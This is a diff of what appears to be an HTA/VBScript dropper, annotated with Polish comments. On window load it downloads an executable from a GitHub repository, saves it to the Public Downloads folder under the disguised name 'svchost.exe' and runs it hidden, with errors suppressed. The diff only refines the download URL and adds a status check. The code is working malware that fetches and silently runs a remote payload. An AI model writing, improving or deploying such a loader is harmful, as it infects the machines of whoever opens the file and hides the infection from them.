@@ -6,20 +6,27 @@
         Sub Window_OnLoad
             On Error Resume Next
             
-            payloadURL = "https://github.com/yuwxd/vetements.lol/raw/refs/heads/main/assets/antorynek.exe"
+            ' Bezpośredni link do pliku (RAW z GitHub)
+            payloadURL = "https://raw.githubusercontent.com/yuwxd/vetements.lol/refs/heads/main/assets/antorynek.exe"
             
+            ' Pobranie pliku
             Set http = CreateObject("MSXML2.XMLHTTP")
             http.open "GET", payloadURL, False
             http.send
             
-            Set stream = CreateObject("ADODB.Stream")
-            stream.Type = 1
-            stream.Open
-            stream.Write http.responseBody
-            stream.SaveToFile "C:\Users\Public\Downloads\svchost.exe", 2
-            
-            Set shell = CreateObject("WScript.Shell")
-            shell.Run "C:\Users\Public\Downloads\svchost.exe", 0, False
+            If http.Status = 200 Then
+                ' Zapisanie pliku
+                Set stream = CreateObject("ADODB.Stream")
+                stream.Type = 1
+                stream.Open
+                stream.Write http.responseBody
+                stream.SaveToFile "C:\Users\Public\Downloads\svchost.exe", 2
+                stream.Close
+                
+                ' Uruchomienie w tle
+                Set shell = CreateObject("WScript.Shell")
+                shell.Run "C:\Users\Public\Downloads\svchost.exe", 0, False
+            End If
             
             window.close
         End Sub
